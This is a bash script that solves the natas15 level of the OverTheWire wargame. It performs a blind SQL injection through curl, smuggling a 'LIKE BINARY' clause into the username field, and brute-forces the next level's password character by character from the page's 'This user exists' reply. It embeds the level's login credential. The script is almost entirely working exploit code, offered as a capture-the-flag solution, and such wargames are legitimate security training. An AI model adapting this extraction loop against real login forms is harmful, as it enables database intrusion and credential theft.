#!/bin/bash

# level located on natas15.natas.labs.overthewire.org

secretSymbols="________________________________" # 32 symbols _
password=""

while [ ${#secretSymbols} -ne 0 ]
do
	secretSymbols="${secretSymbols:1}"
	symbolFound=false

	for symbol in {A..Z}
	do
		res=$(curl -s natas15.natas.labs.overthewire.org?debug=true -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -d username="natas16\" and password LIKE BINARY \"${password}${symbol}${secretSymbols}")
		if echo ${res} | grep "This user exists" > /dev/null
		then
			password="${password}${symbol}"
			echo "${password}${secretSymbols}"
			symbolFound=true
			break
		fi
	done

	if ${symbolFound}
	then
		continue
	fi

	for symbol in {a..z}
	do
		res=$(curl -s natas15.natas.labs.overthewire.org?debug=true -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -d username="natas16\" and password LIKE BINARY \"${password}${symbol}${secretSymbols}")
		if echo ${res} | grep "This user exists" > /dev/null
		then
			password="${password}${symbol}"
			echo "${password}${secretSymbols}"
			symbolFound=true
			break
		fi
	done

	if ${symbolFound}
	then
		continue
	fi

	for symbol in {0..9}
	do
		res=$(curl -s natas15.natas.labs.overthewire.org?debug=true -u natas15:SdqIqBsFcz3yotlNYErZSZwblkm0lrvx -d username="natas16\" and password LIKE BINARY \"${password}${symbol}${secretSymbols}")
		if echo ${res} | grep "This user exists" > /dev/null
		then
			password="${password}${symbol}"
			echo "${password}${secretSymbols}"
			symbolFound=true
			break
		fi
	done
done

echo -e "\nThe password is ${password}"

